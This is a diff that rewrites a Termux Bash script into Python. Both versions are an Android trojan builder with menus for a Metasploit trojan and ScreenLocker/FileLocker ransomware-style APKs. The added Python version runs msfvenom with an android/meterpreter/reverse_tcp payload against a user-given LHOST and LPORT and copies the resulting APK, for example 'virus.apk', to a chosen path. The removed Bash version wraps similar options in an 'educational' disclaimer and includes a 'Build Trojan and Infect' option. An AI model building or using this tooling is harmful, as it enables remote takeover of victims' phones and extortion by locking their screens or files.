@@ -1,109 +1,94 @@
-#!/data/data/com.termux/files/usr/bin/bash
+import os
+import time
+import subprocess
 
-# --- COLORES ---
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m'
+# Colores
+R = '\033[31m'
+G = '\033[32m'
+Y = '\033[33m'
+B = '\033[34m'
+W = '\033[0m'
 
-# --- AVISO LEGAL ---
-clear
-echo -e "${RED}############################################################"
-echo -e "#                AVISO DE RESPONSABILIDAD                  #"
-echo -e "############################################################${NC}"
-echo -e "${YELLOW}Este script ha sido creado únicamente con FINES EDUCATIVOS."
-echo -e "El creador NO se hace responsable de daños, cargos legales,"
-echo -e "o mal uso de esta herramienta. Al continuar, aceptas que"
-echo -e "eres el único responsable de tus actos.${NC}"
-echo -e "${RED}############################################################${NC}"
-sleep 2
-
-# --- VERIFICACIÓN DE HERRAMIENTAS ---
-check_tools() {
-    echo -e "${BLUE}[*] Verificando herramientas...${NC}"
-    if ! command -v msfvenom &> /dev/null; then
-        echo -e "${YELLOW}[!] Metasploit no detectado. Intentando instalar...${NC}"
-        pkg install metasploit -y
-    fi
+def banner():
+    print(f"""{R}
+    __  __            _2__               _   _            _        
+   |  \/  |          |  | |             | | | |          | |       
+   | \  / | __ _  ___|  | | _____ _ __  | |_| | __ _  ___| | _____ 
+   | |\/| |/ _` |/ __|  | |/ / _ \ '__| |  _  |/ _` |/ __| |/ / __|
+   | |  | | (_| | (__|  |   <  __/ |    | | | | (_| | (__|   <\__ \\
+   |_|  |_|\__,_|\___|__|_|\_\___|_|    \_| |_/\__,_|\___|_|\_\___/
+    {W}
+               {B}--- HACKERHACKS ---{W}
     
-    if ! command -v apktool &> /dev/null; then
-        echo -e "${YELLOW}[!] Apktool no detectado. Clonando repositorio...${NC}"
-        git clone https://github.com/rendiix/termux-apktool
-        cd termux-apktool && chmod +x install.sh && ./install.sh && cd ..
-    fi
+             .-'''''---..._
+           .'  _     _   _  '.
+          /   (o)   (o) (o)   \\     {G} (CALAVERA PULPO SDK){W}
+         |                     |
+         |   _  _  _  _  _  _  |
+          \  (_)(_)(_)(_)(_)(_) /
+           '.               .'
+             '--...___...--'
+    """)
 
-    # Descarga de UberSigner (15 segundos después como pediste)
-    if [ ! -d "uber-apk-signer" ]; then
-        echo -e "${BLUE}[*] Preparando UberSigner en 15 segundos...${NC}"
-        sleep 15
-        git clone https://github.com/patrickfav/uber-apk-signer
-    fi
-}
+def check_msf():
+    # Intento de verificar/instalar msfvenom 3 veces
+    for i in range(1, 4):
+        print(f"{Y}[*] Verificando msfvenom (Intento {i}/3)...{W}")
+        check = subprocess.run(["command -v msfvenom"], shell=True, capture_output=True)
+        if check.returncode == 0:
+            print(f"{G}[+] msfvenom detectado.{W}")
+            return True
+        else:
+            print(f"{R}[!] No encontrado. Instalando...{W}")
+            os.system("pkg install metasploit -y")
+    return False
 
-# --- MENÚS ---
-main_menu() {
-    echo -e "\n${GREEN}--- SARA: ANDROID RESEARCH TOOL ---${NC}"
-    echo -e "1. Build Custom Trojan (Metasploit)"
-    echo -e "2. Build Trojan and Infect (Auto-Build)"
-    echo -e "3. Exit"
-    read -p "Selecciona una opción: " opt
-    case $opt in
-        1) build_menu ;;
-        2) auto_infect ;;
-        3) exit 0 ;;
-        *) main_menu ;;
-    esac
-}
-
-build_menu() {
-    clear
-    echo -e "${BLUE}--- TROJAN BUILDER ---${NC}"
-    echo -e "1. ScreenLocker (Legacy SDK 4.4 Overlay)"
-    echo -e "2. FileLocker (AES Encryption Research)"
-    echo -e "3. Back to Previous"
-    read -p "Opción: " bopt
+def build_trojan():
+    print(f"\n{B}[1] GENERANDO TROYANO CON MSFVENOM{W}")
+    ip = input("LHOST: ")
+    port = input("LPORT: ")
+    name = input("Nombre de salida (ej: virus.apk): ")
+    path = input("Ruta de destino (ej: /sdcard/): ")
     
-    case $bopt in
-        1) build_screenlocker ;;
-        2) build_filelocker ;;
-        3) main_menu ;;
-        *) build_menu ;;
-    esac
-}
-
-# --- MÓDULO SCREENLOCKER ---
-build_screenlocker() {
-    echo -e "${YELLOW}--- CONFIGURACIÓN SCREENLOCKER ---${NC}"
-    read -p "Ingrese el Título (Header): " head
-    read -p "Ingrese la Descripción: " desc
-    read -p "Ruta del Icono (SOLO .PNG): " icon
-    read -p "Ingrese la Key de desbloqueo: " key
+    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {name}"
+    os.system(cmd)
     
-    echo -e "${BLUE}[*] Generando APK con Layout Central y Overlay (SDK 19)...${NC}"
-    # Aquí se usaría msfvenom para generar el payload base
-    # msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o base.apk
-    echo -e "${GREEN}[+] ScreenLocker compilado con éxito (Simulado para educación).${NC}"
-    sleep 2
-    build_menu
-}
+    if os.path.exists(name):
+        os.system(f"cp {name} {path}")
+        print(f"{G}[+] Movido a {path}{W}")
 
-# --- MÓDULO FILELOCKER ---
-build_filelocker() {
-    echo -e "${RED}--- ADVERTENCIA: CIFRADO REAL ---${NC}"
-    echo -e "Este módulo cifra archivos reales. ID de dispositivo generado.${NC}"
-    dev_id=$(head /dev/urandom | tr -dc A-Z0-9 | head -c 8)
-    echo -e "${YELLOW}Device ID: $dev_id${NC}"
-    read -p "Establecer Master Key: " fkey
+def build_apktool_project(mode):
+    # Lógica para FileLocker (2) o ScreenLocker (3)
+    print(f"\n{B}[*] CONFIGURANDO {mode.upper()} CON APKTOOL{W}")
+    name = input("Nombre de la APK: ")
+    # Aquí iría la lógica de descompilar/modificar/recompilar
+    print(f"{Y}[*] Usando apktool b para compilar...{W}")
+    os.system(f"apktool b project_folder -o {name}")
     
-    echo -e "${BLUE}[*] Compilando APK compatible con Android 1.1 hasta actual...${NC}"
-    # Lógica de construcción con apktool
-    # apktool b locker_folder -o filelocker.apk
-    echo -e "${GREEN}[+] FileLocker listo para pruebas en entornos controlados.${NC}"
-    sleep 2
-    build_menu
-}
+    path = input("Ruta para copiar (cp): ")
+    os.system(f"cp {name} {path}")
+    print(f"{G}[+] {name} enviado a {path}{W}")
 
-# --- INICIO ---
-check_tools
-main_menu
+def main():
+    banner()
+    check_msf()
+    
+    print(f"""
+    1. Build Custom Trojan (msfvenom)
+    2. Build FileLocker (apktool)
+    3. Build ScreenLocker (apktool + SDK Legacy)
+    """)
+    
+    opc = input("Selecciona: ")
+    
+    if opc == '1':
+        build_trojan()
+    elif opc == '2':
+        build_apktool_project("FileLocker")
+    elif opc == '3':
+        build_apktool_project("ScreenLocker")
+    else:
+        print("Opción no válida.")
+
+if __name__ == "__main__":
+    main()
